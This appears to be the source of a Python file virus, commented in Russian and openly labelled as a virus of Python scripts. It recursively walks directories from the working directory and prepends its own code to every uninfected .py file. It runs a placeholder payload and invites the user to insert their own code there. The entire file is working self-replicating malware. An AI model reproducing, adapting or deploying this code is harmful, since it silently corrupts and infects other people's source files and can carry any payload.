#STARTED#
import sys, os # Вирус питон скриптов
def virus(python): # Функция проверки и распространения вируса 
	begin="#STARTED#\n"; end="#STOPPED#\n"
	with open(sys.argv[0],"r") as copy: # Открытие запущенного файла
		k=0; virus_code="\n" # Объявление переменной-счётчика и начала строки вирус-кода
		for line in copy: # Построчное прочтение файла
			if line==begin: k=1; virus_code+=begin # Если строка начинается с begin, то вирус найден
			elif k==1 and line!=end: virus_code+=line # Копировать строки
			elif line==end: virus_code+=end; break # Если строка заканчивается end, то прекратить копирование 
			else: pass # Пропускать линии
	with open(python,"r") as file: # Открытие и чтение файла-жертвы на наличие вируса
		origin_code="" # Объявление переменной
		for line in file: # Построчное чтение файла
			origin_code+=line # Добавлять каждую строку в переменную
			if line==begin: Virus=True; break # Если вирус был найден в файле, то прекратить дальнейшую проверку
			else: Virus=False # Иначе продолжать до тех пор, пока файл не будет полностью прочитан
	if Virus==False: # Если вирус не был обнаружен
		with open(python,"w") as paste: # Перезаписать файл
			paste.write(virus_code+"\n\n"+origin_code) # Вставить сначала вирус код, а далее вставить оригинальный код программы
	else: pass # Если вирус был найден - пропустить
def code(void): # Функция дополнительного кода
	print("Infected") # Ваш дополнительный код
code(None) # Выполнение функции
def walk(dir): # Функция парсинга директорий
	for name in os.listdir(dir): # Парсинг файлов и директорий в указанной директории
		path = os.path.join(dir, name) # Полный путь к файлу или директории
		if os.path.isfile(path): # Если полный путь является файлом
			if os.path.splitext(path)[1]==".py": # И если расширение является .py
				virus(path) # Выполнить функцию virus и передать файл
			else: pass # Иначе, если другое расширение - пропустить
		else: walk(path) # Иначе, если это директория, перейти в неё
walk(os.getcwd()) # Указание корневой директории
#STOPPED#